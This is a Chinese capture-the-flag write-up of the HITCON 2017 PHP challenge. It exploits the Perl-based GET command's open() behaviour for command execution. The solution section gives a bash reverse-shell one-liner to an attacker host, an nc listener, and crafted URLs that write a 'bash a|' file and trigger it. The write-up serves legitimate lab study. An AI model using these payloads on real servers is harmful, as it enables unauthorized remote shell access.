---
题目地址：（HITCON2017）题目并不是你想要的http://117.50.3.97:8004
---
 
直接点开源码，读一下
```
<?php 
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);   //定义一个路径
    @mkdir($sandbox);  //创建路径
    @chdir($sandbox);  //切换到这个路径

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));  // escapeshellarg是将字符转码成可以再命令行里面执行的 会转义单引号，只能传递一个参数不能执行不同的命令
    $info = pathinfo($_GET["filename"]); //返回路径中有关信息会返回一个数组，里面有文件名，路径，文件后缀等等信息，比如/etc/httpd/conf/httpd.conf 返回的dirname里面就是/etc/httpd/conf
    $dir  = str_replace(".", "", basename($info["dirname"]));   //basename返回路径中文件名的部分 接着上面的例子  basename($info["dirname"])的结果就是conf
    @mkdir($dir); //创建路径
    @chdir($dir); //切换到路径
    @file_put_contents(basename($info["basename"]), $data); //将data写到basename($info["basename"])文件里面
    highlight_file(__FILE__); 
```
测试上传写php一句话无效，上传的目录里面根本不解析php

相关知识点：
> linux GET命令可用于向WWW服务器和本地文件系统发送请求。从stdin读取POST和PUT方法的请求内容。响应的内容打印在stdout上。错误消息打印在stderr上。程序返回一个状态值，指示失败的URL数。
详情可以参考：https://www.lifewire.com/get-linux-command-4093526
**注意这里面GET是可以GET本地文件的**
而GET命令有一个命令执行的漏洞：
![title](https://i.loli.net/2019/04/26/5cc2f761b3aa3.jpg)
[GET的命令执行漏洞](https://err0rzz.github.io/2017/11/14/GET%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/) 这个博客里面做了比较详细的分析，是因为perl的open可以执行命令 而GET命令刚好使用了这个函数

# 解题思路 
使用写入名为`xx|`的bash脚本，利用GET命令的命令执行来执行脚本payload如下：
```
先在公网vps web目录下写入反弹shell一句话
bash -i >& /dev/tcp/公网IP/公网端口 0>&1
然后写入一个的文件
http://117.50.3.97:8004/?url=http://ipv4.ssssdl.xyz/aa.txt&filename=a
写入bash a|文件，相当于例子中的touch id|
http://117.50.3.97:8004/?url=&filename=bash a|
公网服务器监听端口反弹shell
nc -lvp 7777
尝试命令执行：
http://117.50.3.97:8004/?url=file:bash%20a|&filename=dadsdasd
```


